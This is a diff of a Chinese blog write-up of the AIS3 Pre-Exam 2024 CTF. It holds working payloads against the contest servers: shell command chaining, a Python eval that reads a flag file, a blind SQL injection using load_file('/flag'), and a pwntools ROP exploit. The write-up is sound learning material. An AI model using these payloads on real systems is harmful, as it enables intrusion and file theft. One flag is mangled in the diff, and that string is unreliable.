@@ -3,6 +3,7 @@ title: 【CTF-WriteUp】AIS3 Pre-Exam 2024
 date: 2024-06-11
 tags:
   - ctf
+  - security
 ---
 
 # AIS3 Pre-Exam 2024
@@ -33,12 +34,9 @@ My First CTF：潛力獎
 
 ![image](/images/ctf/ais3_pre_exam_2024/welcome.png)
 
-
 #### FLAG:
 
 AIS3{Welc0me_to_AIS3_PreExam_2o24!}
-
-
 
 ### Quantum Nim Heist
 
@@ -139,7 +137,6 @@ def play(game: Game):
 
 附上解題過程：
 
-
 ```
 $ nc chals1.ais3.org 40004
 ...
@@ -215,7 +212,6 @@ how many stones do you remove? 1
 
 ```
 
-
 #### FLAG:
 
 AIS3{Ar3_y0u_a_N1m_ma57er_0r_a_Crypt0_ma57er?}
@@ -284,12 +280,11 @@ M107
 
 AIS3{b4d1y_tun3d_PriN73r}
 
-
 ### Emoji Console
 
 ```
-🔺🐍 😡 🅰️ 🆒 1️⃣Ⓜ️🅾️ 🚅☠️✉️ 🥫🫵 🔍🚩⁉️ 
-Connection info: http://chals1.ais3.org:5000 
+🔺🐍 😡 🅰️ 🆒 1️⃣Ⓜ️🅾️ 🚅☠️✉️ 🥫🫵 🔍🚩⁉️
+Connection info: http://chals1.ais3.org:5000
 Author: TriangleSnake
 ```
 
@@ -299,25 +294,23 @@ Author: TriangleSnake
 
 ![emoji_console_1](/images/ctf/ais3_pre_exam_2024/emoji_console_1.png)
 
-於是使用 `💿 🚩😓😶🐍 ⭐` ( cd flag;/:|python * ) 來執行這個 .py 檔
+於是使用 `💿 🚩😓😶🐍 ⭐` ( cd flag;/:|python \* ) 來執行這個 .py 檔
 
 其實就是考 Linux 指令的 `;` 跟 `|` 的用法
 
 ![emoji_console_2](/images/ctf/ais3_pre_exam_2024/emoji_console_2.png)
 
-
 #### FLAG:
 
 AIS3{🫵🪡🉐🤙🤙🤙👉👉🚩👈👈}
-
 
 ## Web
 
 ### Evil Calculator
 
 ```
-This is a calculator written in Python. It's a simple calculator, but some function in it is VERY EVIL!! 
-Connection info: http://chals1.ais3.org:5001 
+This is a calculator written in Python. It's a simple calculator, but some function in it is VERY EVIL!!
+Connection info: http://chals1.ais3.org:5001
 Author: TriangleSnake
 ```
 
@@ -353,7 +346,6 @@ appendToExpression('open(\'../flag\').read()')
 
 AIS3{7RiANG13_5NAK3_I5_50_3Vi1}
 
-
 ### Capoost
 
 ```
@@ -370,11 +362,9 @@ Author: Chumy
 
 ![image](/images/ctf/ais3_pre_exam_2024/capoost_1.png)
 
-
 帳號密碼先隨便打
 
 ![image](/images/ctf/ais3_pre_exam_2024/capoost_2.png)
-
 
 在 Create New Post 中 F12，看到
 
@@ -512,10 +502,11 @@ func readflag() string {
 而這裡也有一些 function 看起來可以繞過檢查，像是 slice:
 https://pkg.go.dev/text/template#hdr-Functions
 
-然而管理員沒辦法新增貼文，但後來從 ../capoost/models/post/post.go 的 UnmarshalJSON 
+然而管理員沒辦法新增貼文，但後來從 ../capoost/models/post/post.go 的 UnmarshalJSON
 發現其實可以在 post 封包新增 Owner 一欄，而蓋掉原本的 Owner，也就是可以偽造發文者
 
 capoost/models/post
+
 ```go
 func (c *Post) UnmarshalJSON(b []byte) error {
     var tmp postjson
@@ -542,11 +533,9 @@ func (c *Post) UnmarshalJSON(b []byte) error {
 
 ![image](/images/ctf/ais3_pre_exam_2024/capoost_8.png)
 
-
 再點進去就能看到 hex(flag) : 414953337b676f5f347734795f5768595f4172335f7930555f483352335f4361706f6f3a287d
 
 ![image](/images/ctf/ais3_pre_exam_2024/capoost_9.png)
-
 
 解碼後就能得到
 
@@ -555,7 +544,6 @@ func (c *Post) UnmarshalJSON(b []byte) error {
 #### FLAG:
 
 AIS3{go_4w4y_WhY_Ar3_y0U_H3R3_Capoo:(}
-
 
 ### It's MyGO!!!!
 
@@ -575,7 +563,6 @@ Author: ItisCaleb
 
 這題是我賽後才補上的，因為 Union 被擋住讓我卡好久...orz
 
-
 網頁中有送 Data 的地方只有那四首原創曲
 
 `http://chals1.ais3.org:11454/song?id=xxx`
@@ -594,10 +581,10 @@ Payload：
 id=1 and ascii(substr((select load_file('/flag') limit 0,1),X,1)) > Y
 ```
 
-* load_file()：MySQL 讀檔案的方法
-* limit n, m：從第 n 筆開始取 m 筆資料
-* substr(x, y, z)：將字串 x 從第 y 個字開始切 z 個字
-* ascii()：把字元用 ASCII 轉換成數字
+- load_file()：MySQL 讀檔案的方法
+- limit n, m：從第 n 筆開始取 m 筆資料
+- substr(x, y, z)：將字串 x 從第 y 個字開始切 z 個字
+- ascii()：把字元用 ASCII 轉換成數字
 
 因為只能知道 True 或 False，所以 X 跟 Y 要慢慢搜，先將 Y 設為 0，X 從 1 到 100 開始二分搜，可以知道 FLAG 的長度為 62
 
@@ -606,7 +593,6 @@ id=1 and ascii(substr((select load_file('/flag') limit 0,1),X,1)) > Y
 所以要先固定 X，然後二分搜 Y 的值(1~256，因為 UTF-8 一個字元是 0~256)，如果結果是 No Data 表示搜尋的值 >= target，否則就是 < target
 
 就這樣一個字元一個字元找
-
 
 ```
 http://chals1.ais3.org:11454/song?id=1 and ascii(substr((select load_file('/flag') limit 0,1),1,1)) > 65
@@ -618,7 +604,7 @@ http://chals1.ais3.org:11454/song?id=1 and ascii(substr((select load_file('/flag
 以此類推得到結果為：
 
 ```
-"AIS3{CRYCHIC_Funeral_" + 
+"AIS3{CRYCHIC_Funeral_" +
 240,159,152,173,
 240,159,142,184,
 240,159,152,173,
@@ -638,7 +624,7 @@ http://chals1.ais3.org:11454/song?id=1 and ascii(substr((select load_file('/flag
 
 #### FLAG：
 
-AIS3{CRYCHIC_Funeral_😭🎸😭🎸😭🎤😭🥁😸🎸}
+AIS3{CRYCHIC*Funeral*😭🎸😭🎸😭🎤😭🥁😸🎸}
 
 ## Rev
 
@@ -682,11 +668,10 @@ Author: Kazma
 
 ![image](/images/ctf/ais3_pre_exam_2024/mathter_1.png)
 
-* Partial RELRO
-* 有開 Canary
-* 不可執行
-* 沒開 ASLR
-
+- Partial RELRO
+- 有開 Canary
+- 不可執行
+- 沒開 ASLR
 
 開 IDA，其中 goodbye() 有 Buffer Overflow
 
@@ -725,7 +710,7 @@ if args.REMOTE:
     p = remote(ip, port)
 else:
     p = process()
-    
+
 
 p.recvuntil(b'_|\\__\\___|_|\n')
 p.sendline(b'q') # 進 goodbye()
@@ -736,7 +721,7 @@ win1 = 0x4018c5 # win 1 的 address
 win2 = 0x401997 # win 2 的 address
 pop_rdi = 0x402540 # 找到的 Gadget 的 address
 
-payload = flat([b'A' * pad, pop_rdi,0xDEADBEEF,win1,pop_rdi,0xCAFEBABE,win2]) 
+payload = flat([b'A' * pad, pop_rdi,0xDEADBEEF,win1,pop_rdi,0xCAFEBABE,win2])
 # 兩個要檢查的數字是 0xDEADBEEF 跟 0xCAFEBABE，pop rdi 會把 rdi 設成 stack top 的值
 p.sendlineafter(b'[Y/n]', payload);
 
@@ -744,9 +729,6 @@ p.interactive()
 ```
 
 ![image](/images/ctf/ais3_pre_exam_2024/mathter_6.png)
-
-
-
 
 #### FLAG:
 
